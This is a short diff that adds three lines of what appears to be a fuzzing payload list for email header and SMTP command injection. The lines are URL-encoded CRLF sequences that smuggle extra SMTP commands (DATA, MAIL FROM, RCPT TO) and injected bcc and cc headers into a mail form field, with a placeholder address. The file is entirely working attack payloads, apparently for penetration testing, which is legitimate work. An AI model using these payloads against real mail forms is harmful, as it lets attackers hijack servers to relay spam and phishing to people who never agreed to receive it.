@@ -1,0 +1,3 @@
+%0d%0adata%0d%0afoo%0d%0a%2e%0d%0amail+from:+<youremail>%0d%0arcpt+to:+<youremail>%0d%0adata%0d%0afrom:+<youremail>%0d%0ato:+<youremail>%0d%0asubject:+test%0d%0afoo%0d%0a%2e%0d%0a
+<youremail>%0d%0abcc:<youremail>
+<youremail>%0d%0acc:<youremail>
